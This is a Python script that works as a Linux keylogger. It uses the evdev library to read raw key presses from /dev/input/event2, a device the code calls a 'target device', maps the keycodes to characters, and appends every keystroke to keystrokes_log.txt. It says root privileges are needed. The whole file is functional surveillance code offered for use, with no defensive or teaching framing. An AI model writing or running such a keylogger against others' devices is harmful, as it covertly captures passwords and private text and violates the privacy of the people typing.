import evdev

# Input device file (from Handler: event2)
device_path = '/dev/input/event2'

# Mapping common Linux keycodes to readable characters
KEY_MAP = {
    'KEY_A': 'a', 'KEY_B': 'b', 'KEY_C': 'c', 'KEY_D': 'd', 'KEY_E': 'e',
    'KEY_F': 'f', 'KEY_G': 'g', 'KEY_H': 'h', 'KEY_I': 'i', 'KEY_J': 'j',
    'KEY_K': 'k', 'KEY_L': 'l', 'KEY_M': 'm', 'KEY_N': 'n', 'KEY_O': 'o',
    'KEY_P': 'p', 'KEY_Q': 'q', 'KEY_R': 'r', 'KEY_S': 's', 'KEY_T': 't',
    'KEY_U': 'u', 'KEY_V': 'v', 'KEY_W': 'w', 'KEY_X': 'x', 'KEY_Y': 'y',
    'KEY_Z': 'z', 'KEY_1': '1', 'KEY_2': '2', 'KEY_3': '3', 'KEY_4': '4',
    'KEY_5': '5', 'KEY_6': '6', 'KEY_7': '7', 'KEY_8': '8', 'KEY_9': '9',
    'KEY_0': '0', 'KEY_SPACE': ' ', 'KEY_ENTER': '\n', 'KEY_BACKSPACE': '[BACKSPACE]'
}

def start_logger():
    try:
        # Accessing the physical keyboard input
        device = evdev.InputDevice(device_path)
        print(f"[*] Listening to target device: {device.name}")
        
        with open("keystrokes_log.txt", "a") as log_file:
            for event in device.read_loop():
                # EV_KEY represents key press/release events
                if event.type == evdev.ecodes.EV_KEY:
                    key_event = evdev.categorize(event)
                    # key_down state indicates a physical key press (value = 1)
                    if key_event.keystate == key_event.key_down:
                        key_code = key_event.keycode
                        char = KEY_MAP.get(key_code, f"[{key_code}]")
                        
                        log_file.write(char)
                        log_file.flush() # Flush to file instantly
                        print(f"Logged: {key_code} -> {char}")

    except PermissionError:
        print("[!] Access denied: Root standard privileges required to read raw input.")
    except Exception as e:
        print(f"[!] Exception encountered: {e}")

if __name__ == "__main__":
    start_logger()
